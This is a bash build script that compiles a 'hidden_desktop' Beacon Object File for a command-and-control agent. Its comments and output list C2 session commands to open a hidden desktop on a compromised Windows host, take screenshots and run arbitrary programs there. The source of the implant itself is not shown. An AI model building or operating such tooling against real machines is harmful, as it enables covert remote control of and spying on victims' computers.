#!/bin/bash
# build_hidden_desktop.sh — Compile hidden_desktop BOF to COFF object file
#
# Output: hidden_desktop.x64.o (COFF format, loadable by agent's BOF loader)
#
# Requirements:
#   - mingw-w64 (x86_64-w64-mingw32-gcc)
#
# Usage:
#   ./build_hidden_desktop.sh
#
# After build, the .o file can be uploaded to C2 server and loaded via:
#   bof hidden_desktop start
#   bof hidden_desktop screenshot
#   bof hidden_desktop list
#   bof hidden_desktop stop
#   bof hidden_desktop exec <cmdline>

set -e

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SRC="$SCRIPT_DIR/hidden_desktop.c"
OUT="$SCRIPT_DIR/hidden_desktop.x64.o"

# Find mingw cross-compiler
CC="x86_64-w64-mingw32-gcc"
if ! command -v "$CC" &>/dev/null; then
    echo "[-] $CC not found"
    echo "    Install: sudo apt install gcc-mingw-w64-x86-64"
    exit 1
fi

echo "[*] Compiling hidden_desktop BOF..."
echo "    Source: $SRC"
echo "    Output: $OUT"

# Compile as COFF object file (not executable)
# -DBOF         — enables BOF mode (BeaconAPI, no main)
# -c            — compile only, produce .o
# -O2           — optimize
# -Wall         — warnings
# -nostdlib     — no standard library (BOF runs in host process)
# -shared       — produce position-independent code
"$CC" \
    -DBOF \
    -c \
    -O2 \
    -Wall \
    -nostdlib \
    -fno-exceptions \
    -fno-unwind-tables \
    -fno-asynchronous-unwind-tables \
    -fno-ident \
    -o "$OUT" \
    "$SRC"

echo "[+] Build successful!"
echo "    File: $OUT ($(stat -c%s "$OUT" 2>/dev/null || echo "?") bytes)"
echo ""
echo "[*] To use:"
echo "    1. Upload hidden_desktop.x64.o to C2 server (payload/ or data/bof/)"
echo "    2. From session terminal:"
echo "       bof hidden_desktop start"
echo "       bof hidden_desktop screenshot"
echo "       bof hidden_desktop list"
echo "       bof hidden_desktop exec calc.exe"
echo "       bof hidden_desktop stop"
